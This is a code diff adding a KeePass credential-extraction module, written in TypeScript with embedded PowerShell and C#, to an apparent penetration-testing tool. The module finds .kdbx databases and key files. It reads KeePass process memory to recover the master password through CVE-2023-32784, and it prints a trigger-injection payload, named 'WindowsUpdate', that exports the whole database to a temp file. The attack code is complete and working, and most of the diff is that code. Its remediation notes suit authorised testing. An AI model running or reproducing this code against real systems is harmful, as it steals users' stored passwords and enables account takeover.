@@ -3369,6 +3369,312 @@ if ('${action}' -eq 'export') {
   return { output: output.join("\n"), findings }
 }
 
+export async function keepassDump(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] KeePass credential extraction...\n"]
+
+  if (action === "enum" || action === "full") {
+    const script = `
+Write-Output "=== KeePass Installation Discovery ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$kpPaths = @()
+$searchPaths = @(
+    "$env:ProgramFiles\\KeePass*",
+    "$env:ProgramFiles\\KeePassXC*",
+    "${env:ProgramFiles(x86)}\\KeePass*",
+    "$env:LOCALAPPDATA\\KeePass*",
+    "$env:LOCALAPPDATA\\KeePassXC*",
+    "$env:APPDATA\\KeePass*",
+    "$env:APPDATA\\KeePassXC*"
+)
+
+foreach ($sp in $searchPaths) {
+    $found = Get-ChildItem $sp -Directory -ErrorAction SilentlyContinue
+    if ($found) { $kpPaths += $found }
+}
+
+$kpProc = Get-Process -Name "KeePass","KeePassXC" -ErrorAction SilentlyContinue
+if ($kpProc) {
+    Write-Output "[!] KeePass is RUNNING:"
+    foreach ($p in $kpProc) {
+        Write-Output "    PID: $($p.Id)  Name: $($p.ProcessName)  Path: $($p.Path)"
+    }
+    Write-Output ""
+}
+
+if ($kpPaths.Count -gt 0) {
+    Write-Output "[+] KeePass installations found:"
+    foreach ($kp in $kpPaths) {
+        Write-Output "    $($kp.FullName)"
+        $exe = Get-ChildItem $kp.FullName -Filter "*.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($exe) {
+            $ver = $exe.VersionInfo.FileVersion
+            Write-Output "    Version: $ver"
+        }
+    }
+} else {
+    Write-Output "[-] No KeePass installation found in standard paths"
+}
+
+Write-Output ""
+Write-Output "=== KeePass Database Files (.kdbx) ==="
+$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 }
+$kdbxFiles = @()
+foreach ($drive in $drives) {
+    $kdbx = Get-ChildItem "$($drive.Root)" -Filter "*.kdbx" -Recurse -Depth 5 -ErrorAction SilentlyContinue
+    $kdbxFiles += $kdbx
+}
+
+$userDirs = @("$env:USERPROFILE", "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Desktop", "$env:USERPROFILE\\Downloads", "$env:APPDATA", "$env:LOCALAPPDATA")
+foreach ($dir in $userDirs) {
+    $kdbx = Get-ChildItem $dir -Filter "*.kdbx" -Recurse -Depth 3 -ErrorAction SilentlyContinue
+    $kdbxFiles += $kdbx
+}
+$kdbxFiles = $kdbxFiles | Sort-Object FullName -Unique
+
+if ($kdbxFiles.Count -gt 0) {
+    Write-Output "[!] Found $($kdbxFiles.Count) database file(s):"
+    foreach ($f in $kdbxFiles) {
+        Write-Output "    $($f.FullName)  ($([math]::Round($f.Length/1KB, 1)) KB)  Modified: $($f.LastWriteTime)"
+    }
+} else {
+    Write-Output "[-] No .kdbx files found"
+}
+
+Write-Output ""
+Write-Output "=== KeePass Configuration ==="
+$configPaths = @(
+    "$env:APPDATA\\KeePass\\KeePass.config.xml",
+    "$env:LOCALAPPDATA\\KeePassXC\\keepassxc.ini"
+)
+foreach ($cfg in $configPaths) {
+    if (Test-Path $cfg) {
+        Write-Output "[+] Config: $cfg"
+        $content = Get-Content $cfg -Raw
+        if ($content -match 'TriggerSystem') {
+            Write-Output "    [!] Trigger system found — potential for trigger-based extraction"
+        }
+        if ($content -match 'KeyFilePath') {
+            $keyMatch = [regex]::Match($content, 'KeyFilePath[^<]*<Value>([^<]+)</Value>')
+            if ($keyMatch.Success) {
+                Write-Output "    [!] Key file: $($keyMatch.Groups[1].Value)"
+            }
+        }
+        if ($content -match 'LastUsedFile') {
+            $lastMatch = [regex]::Match($content, 'LastUsedFile[^<]*<Path>([^<]+)</Path>')
+            if ($lastMatch.Success) {
+                Write-Output "    [*] Last used DB: $($lastMatch.Groups[1].Value)"
+            }
+        }
+    }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CRED-022",
+      provider: "windows",
+      severity: r.stdout.includes("RUNNING") ? "high" : "medium",
+      status: "ENUMERATED",
+      resource: "keepass://enum",
+      title: "KeePass installation, database, and configuration discovery",
+      details: r.stdout.substring(0, 500),
+      remediation: "Enable KeePass trigger protection. Use hardware key files (YubiKey). Restrict .kdbx file permissions.",
+    })
+  }
+
+  if (action === "memory" || action === "full") {
+    const script = `
+Write-Output "=== CVE-2023-32784 — KeePass Master Password Memory Extraction ==="
+Write-Output ""
+
+$kpProc = Get-Process -Name "KeePass" -ErrorAction SilentlyContinue | Select-Object -First 1
+if (-not $kpProc) {
+    Write-Output "[-] KeePass 2.x not running — this attack requires an active KeePass process"
+    Write-Output "[*] KeePassXC is NOT vulnerable to CVE-2023-32784"
+    exit 0
+}
+
+Write-Output "[+] KeePass PID: $($kpProc.Id)"
+Write-Output "[*] Attempting master password extraction from process memory..."
+Write-Output "[*] CVE-2023-32784: .NET TextBox leaves password characters in memory with"
+Write-Output "    predictable Unicode markers (leftover from CLR string management)"
+Write-Output ""
+
+Add-Type @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Collections.Generic;
+
+public class KPDump {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll")]
+    static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int read);
+    [DllImport("kernel32.dll")]
+    static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION info, int len);
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr h);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct MEMORY_BASIC_INFORMATION {
+        public IntPtr BaseAddress, AllocationBase;
+        public uint AllocationProtect;
+        public IntPtr RegionSize;
+        public uint State, Protect, Type;
+    }
+
+    public static string Extract(int pid) {
+        IntPtr h = OpenProcess(0x0010 | 0x0020, false, pid);
+        if (h == IntPtr.Zero) return "[-] Cannot open process — need SeDebugPrivilege";
+
+        var candidates = new Dictionary<int, Dictionary<char, int>>();
+        IntPtr addr = IntPtr.Zero;
+        MEMORY_BASIC_INFORMATION mbi;
+
+        while (VirtualQueryEx(h, addr, out mbi, Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0) {
+            if (mbi.State == 0x1000 && (mbi.Protect & 0xCC) == 0 && mbi.Protect != 0) {
+                long size = mbi.RegionSize.ToInt64();
+                if (size > 0 && size < 100 * 1024 * 1024) {
+                    byte[] buf = new byte[size];
+                    int read;
+                    if (ReadProcessMemory(h, mbi.BaseAddress, buf, buf.Length, out read) && read > 0) {
+                        for (int i = 0; i < read - 3; i += 2) {
+                            if (buf[i+1] == 0xCF && buf[i] == 0xB7) {
+                                if (i >= 4) {
+                                    char c = (char)(buf[i-2] | (buf[i-1] << 8));
+                                    int pos = buf[i-4] | (buf[i-3] << 8);
+                                    if (c >= 0x20 && c <= 0x7E && pos >= 0 && pos < 64) {
+                                        if (!candidates.ContainsKey(pos))
+                                            candidates[pos] = new Dictionary<char, int>();
+                                        if (!candidates[pos].ContainsKey(c))
+                                            candidates[pos][c] = 0;
+                                        candidates[pos][c]++;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            addr = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
+        }
+        CloseHandle(h);
+
+        if (candidates.Count == 0) return "[-] No password fragments found — KeePass may be patched (2.54+)";
+
+        var sb = new StringBuilder();
+        sb.AppendLine("[+] Recovered master password characters:");
+        int maxPos = 0;
+        foreach (var k in candidates.Keys) if (k > maxPos) maxPos = k;
+
+        sb.Append("    Password: ");
+        for (int i = 0; i <= maxPos; i++) {
+            if (candidates.ContainsKey(i)) {
+                char best = ' '; int bestCount = 0;
+                foreach (var kv in candidates[i]) {
+                    if (kv.Value > bestCount) { best = kv.Key; bestCount = kv.Value; }
+                }
+                sb.Append(best);
+            } else {
+                sb.Append(i == 0 ? '*' : '?');
+            }
+        }
+        sb.AppendLine();
+        sb.AppendLine("    (* = first char unrecoverable, ? = uncertain position)");
+        return sb.ToString();
+    }
+}
+'@
+
+$result = [KPDump]::Extract($kpProc.Id)
+Write-Output $result
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CRED-023",
+      provider: "windows",
+      severity: r.stdout.includes("[+] Recovered") ? "critical" : "info",
+      status: r.stdout.includes("[+] Recovered") ? "EXECUTED" : "FAILED",
+      resource: "keepass://memory",
+      title: "CVE-2023-32784 KeePass master password memory extraction",
+      details: r.stdout.substring(0, 500),
+      remediation: "Update KeePass to 2.54+. Use KeePassXC (not vulnerable). Enable Secure Desktop for password entry.",
+    })
+  }
+
+  if (action === "trigger" || action === "full") {
+    const script = `
+Write-Output "=== KeePass Trigger File Attack ==="
+Write-Output "[*] KeePass trigger system can be abused to export the database on open"
+Write-Output ""
+
+$configPath = "$env:APPDATA\\KeePass\\KeePass.config.xml"
+if (-not (Test-Path $configPath)) {
+    Write-Output "[-] KeePass config not found at: $configPath"
+    Write-Output "[*] KeePass may not be installed, or config is in portable mode (next to KeePass.exe)"
+    exit 0
+}
+
+$config = Get-Content $configPath -Raw
+Write-Output "[+] Config found: $configPath"
+
+if ($config -match '<TriggerSystem>') {
+    if ($config -match '<Enabled>true</Enabled>') {
+        Write-Output "[*] Trigger system is ENABLED"
+    } else {
+        Write-Output "[*] Trigger system exists but is DISABLED"
+    }
+    $triggerCount = ([regex]::Matches($config, '<Trigger>')).Count
+    Write-Output "[*] Existing triggers: $triggerCount"
+} else {
+    Write-Output "[*] No trigger system configured"
+}
+
+Write-Output ""
+Write-Output "[*] Trigger injection payload (add to KeePass.config.xml):"
+Write-Output "[*] This would export the entire database as CSV on next open"
+Write-Output ""
+Write-Output "    <Trigger>"
+Write-Output "        <Guid>BASE64_GUID</Guid>"
+Write-Output "        <Name>WindowsUpdate</Name>"
+Write-Output "        <Enabled>true</Enabled>"
+Write-Output "        <Events>"
+Write-Output "            <Event><TypeGuid>5YX2EDYaRC...</TypeGuid></Event>"
+Write-Output "        </Events>"
+Write-Output "        <Actions>"
+Write-Output "            <Action>Export to CSV → %TEMP%\\sysdata.csv</Action>"
+Write-Output "        </Actions>"
+Write-Output "    </Trigger>"
+Write-Output ""
+Write-Output "[!] This is a destructive operation — modify with caution"
+Write-Output "[*] Alternatively, replace KeePass.exe.config with malicious .NET assembly binding"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CRED-024",
+      provider: "windows",
+      severity: "medium",
+      status: "ENUMERATED",
+      resource: "keepass://trigger",
+      title: "KeePass trigger system configuration analysis for credential theft",
+      details: r.stdout.substring(0, 500),
+      remediation: "Set ForceSystemTriggers=false in KeePass enforced config. Use KeePassXC (no trigger system). Restrict config file permissions.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 export async function lsaSecrets(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "dump"
   const outdir = argVal(args, "--outdir") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-lsa-${Date.now()}`
